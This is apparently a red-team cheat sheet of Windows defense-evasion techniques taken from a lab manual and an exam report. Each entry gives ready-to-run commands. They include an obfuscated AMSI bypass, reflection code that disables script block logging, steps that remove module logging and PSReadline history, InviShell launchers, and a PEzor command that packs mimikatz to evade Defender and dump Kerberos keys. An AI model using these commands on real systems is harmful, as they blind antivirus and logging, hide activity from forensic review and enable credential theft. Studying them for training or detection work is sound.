# Windows Defense Evasion & AMSI Bypass

### AMSI Bypass (Obfuscated One-liner) (LabManual Sliver) [added: 2026-04]
- **Tags:** #AMSI #AMSIBypass #Obfuscation #Reflection #AmsiInitFailed #DefenseEvasion #T1562.001
- **Trigger:** PowerShell AMSI blocks loading of offensive tools; need quick obfuscated patch
- **Prereq:** PowerShell session on target host
- **Yields:** AMSI disabled in current session, allowing execution of flagged scripts (PowerView, Rubeus, etc.)
- **Opsec:** Med
- **Context:** PowerShell AMSI blocks tool execution. Use obfuscated reflection to patch AmsiUtils.
- **Payload/Method:**
```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TY`pE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mati'),'cs','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonP','c','ubl' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

### Script Block Logging Bypass (LabManual Sliver) [added: 2026-04]
- **Tags:** #ScriptBlockLogging #ETW #EventID4104 #LogBypass #PSEtwLogProvider #DefenseEvasion #T1562.003
- **Trigger:** Script block logging (Event ID 4104) is recording PowerShell commands; need to disable ETW provider
- **Prereq:** PowerShell session on target host, .NET reflection not blocked
- **Yields:** Script block logging disabled in current session, preventing PowerShell command recording
- **Opsec:** Med
- **Context:** Script block logging (Event ID 4104) records all PowerShell. Disable via ETW provider reflection.
- **Payload/Method:**
```powershell
# Run sbloggingbypass.ps1 or inline:
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

### Module Logging Disable (LabManual Sliver) [added: 2026-04]
- **Tags:** #ModuleLogging #PipelineLogging #PSSnapin #LogDisable #DefenseEvasion #T1562.003
- **Trigger:** Module logging enabled for PowerShell modules; need to disable per-module pipeline logging
- **Prereq:** PowerShell session, modules loaded that have logging enabled
- **Yields:** Module-level pipeline execution logging disabled for specified modules
- **Opsec:** Low
- **Context:** Module logging is enabled for specific modules. Disable per-module.
- **Payload/Method:**
```powershell
$module = Get-Module Microsoft.PowerShell.Utility
$module.LogPipelineExecutionDetails = $false
$Snapin = Get-PSSnapin Microsoft.PowerShell.Core
$Snapin.LogPipelineExecutionDetails = $false
```

### PSReadline History Bypass (LabManual Sliver) [added: 2026-04]
- **Tags:** #PSReadline #HistoryBypass #ConsoleHistory #CommandHistory #DefenseEvasion #T1070.003
- **Trigger:** PSReadline stores CLI history at ConsoleHost_history.txt; need to prevent command history logging
- **Prereq:** PowerShell session with PSReadline module loaded
- **Yields:** Command history recording disabled, preventing forensic review of typed commands
- **Opsec:** Low
- **Context:** PSReadline stores CLI history at `ConsoleHost_history.txt`. Remove module to prevent logging.
- **Payload/Method:**
```powershell
Remove-Module PSReadline
# Alternatively, timestomp history file after cleanup:
# Use SharpStomp to restore original timestamps
```

### InviShell – Bypass Script Logging + AMSI (CRTE Exam Report) [added: 2026-04]
- **Tags:** #InviShell #AMSIBypass #ScriptLogging #LogBypass #CRTE #DefenseEvasion #T1562.001
- **Trigger:** Need comprehensive logging and AMSI bypass; InviShell available on target
- **Prereq:** InviShell binaries available on target (RunWithRegistryNonAdmin.bat or RunWithPathAsAdmin.bat)
- **Yields:** PowerShell runspace with AMSI and most logging mechanisms bypassed
- **Opsec:** Low
- **Context:** InviShell launches a PowerShell runspace that bypasses most logging mechanisms without being directly inside powershell.exe.
- **Payload/Method:**
```cmd
# Non-admin
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# Admin
C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
```

### PEzor – AV Evasion Wrapper for .NET Assemblies (LabManual Sliver) [added: 2026-04]
- **Tags:** #PEzor #AVEvasion #Donut #Shellcode #Unhook #AntiDebug #DefenseEvasion #T1027.002
- **Trigger:** Defender detects Mimikatz or other offensive tools; need to wrap in evasion layer
- **Prereq:** PEzor installed (WSL/Linux), offensive binary to wrap (e.g., mimikatz.exe)
- **Yields:** Packed .NET assembly with unhook, anti-debug, and memory fluctuation that evades Defender
- **Opsec:** Med
- **Context:** Defender detects mimikatz. Wrap with PEzor to convert to donut shellcode, repack as .NET, add unhook + anti-debug.
- **Payload/Method:**
```bash
cd /mnt/c/AD/Tools/PEzor/
sudo su
./PEzor.sh -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 /path/mimikatz.exe -z 2 -p '"privilege::debug" "token::elevate" "sekurlsa::ekeys" "exit"'
mv mimikatz.exe.packed.dotnet.exe mimikatz-ekeys.exe.packed.dotnet.exe

# Flags reference:
# -z 2: aPLib compression
# -unhook: userland hook removal
# -antidebug: anti-debug checks
# -fluctuate=NA: memory page NOACCESS when sleeping
# -format=dotnet: output as .NET exe for execute-assembly
```
